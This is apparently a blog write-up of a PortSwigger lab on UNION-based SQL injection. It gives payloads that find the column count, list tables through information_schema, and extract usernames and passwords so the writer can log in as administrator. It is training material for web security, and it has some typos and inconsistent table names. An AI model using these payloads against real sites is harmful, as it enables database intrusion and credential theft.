+++
title = 'Sql Injection'
date = 2024-07-19T16:26:59+05:30
slug = "portswigger-SQL-database-listing"
categories = ["portswigger","SQL injection","listing databsse contents","non oracle databases"]
+++


![](https://dl.dropbox.com/scl/fi/oq9yjqzle6rfh2jxb352q/Pasted-image-20240528154701.png?rlkey=rxd3yguzvz3b2kayujtpdanrn&st=c6oqh2ej&dl=0)

From the lab description This lab contains SQL injection Vulnerability in Product category filter 
to solve this lab we need to login as administrator 
this lab contains non oracle databases

refer to SQL CHEAT SHEET for payloads
Let's access the lab 
like as usual we've intercepted the request and sent it to repeater now let's check number of columns and determine the data type of those columns to perform a union attack 

![](https://dl.dropbox.com/scl/fi/m7w07au73tb7lr2ecu2ra/Pasted-image-20240528155320.png?rlkey=xnvxljhlqovgh0nxnlkicevrz&st=1a71ox0p&dl=0)

we got internal server error of we dfo order by 3 so number of columns is 2 now let's determine the datatype of those columns The payload is 
`'+UNION+SELECT+'abc','def'-- `

![](https://dl.dropbox.com/scl/fi/sn5wv3itx1rnsxsgsw5iv/Pasted-image-20240528155700.png?rlkey=k8t9trwqh0qxkjsllsajpzkjb&st=dc8yi8xz&dl=0)

so we now know that both columns are of same data type let's now retrieve the username and password for the file 

![](https://dl.dropbox.com/scl/fi/0cd5tce8qdhsbdaejuifz/Pasted-image-20240528155829.png?rlkey=f21syt9md5jfar0clolfg9eb8&st=bg3iyrhb&dl=0)


payload to retrieve information about list of tables in database

`+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

We got some list of tables let's check them

![](https://dl.dropbox.com/scl/fi/60ulhhur5ir6m6ha1nz9e/Pasted-image-20240528160753.png?rlkey=8rqn1mcdxau4dxl620sw1tbhh&st=xttavidz&dl=0)


![](https://dl.dropbox.com/scl/fi/9cd8uverbzx3imofvmgub/Pasted-image-20240528161215.png?rlkey=9ke0oh0l27zqzmfxhybmh8frl&st=pb65vp8p&dl=0)

the above is the user table 



to retrieve the usernames the payload will be 
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_avyrcv'--

![](https://dl.dropbox.com/scl/fi/v287jdlo2hpvcti034puq/Pasted-image-20240528161452.png?rlkey=jqhu8q3tja0y7gs8dabkpiklf&st=gwdwbnnd&dl=0)

we got a username table and a match with word starting with pass that might be the password table 


username_umpehj


The payload to view password table will be 

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='password_ohgyxof'--



we got our password table too
let's retrieve the details form both tables 

The paylaod will be 


username table : users_avyrcv
password table : password_ohgyxo
username: username_umpehj

'+UNION+SELECT+username_umpehj,+ password_ohgyxo+FROM+users_avyrcv--

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_avyrcv'--

![](https://dl.dropbox.com/scl/fi/4wtvyle7x2vrfiarxu8lk/Pasted-image-20240528164107.png?rlkey=kowdimi0ksncrhoeqqsft1ntc&st=fyi0c92f&dl=0)

let's find administrator details and login 

![](https://dl.dropbox.com/scl/fi/w8y2rcxylsrat2jnywz0n/Pasted-image-20240528164241.png?rlkey=cjaj4guqlrfgb9zp9btrdr7nr&st=ivu3wxft&dl=0)

now let's login

![](https://dl.dropbox.com/scl/fi/6ya24vxfoynky2gl4c3ir/Pasted-image-20240528164353.png?rlkey=7uqwlx73dtyjpwsjtradl7h4v&st=vcybo7nr&dl=0)



